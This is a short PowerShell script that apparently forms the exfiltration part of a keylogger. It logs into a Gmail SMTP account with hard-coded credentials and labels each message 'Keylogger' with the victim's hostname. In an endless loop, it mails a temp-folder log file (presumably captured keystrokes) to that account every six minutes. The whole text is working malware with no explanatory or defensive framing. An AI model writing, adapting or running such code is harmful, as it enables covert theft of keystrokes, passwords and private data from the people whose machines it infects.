$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email.cia.gov@gmail.com', 'CIAGOVEMAIL')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'email.cia.gov@gmail.com'
$ReportEmail.To.Add('email.cia.gov@gmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$ENV:temp\kk-9.txt");$SMTPInfo.Send($ReportEmail);sleep 360}
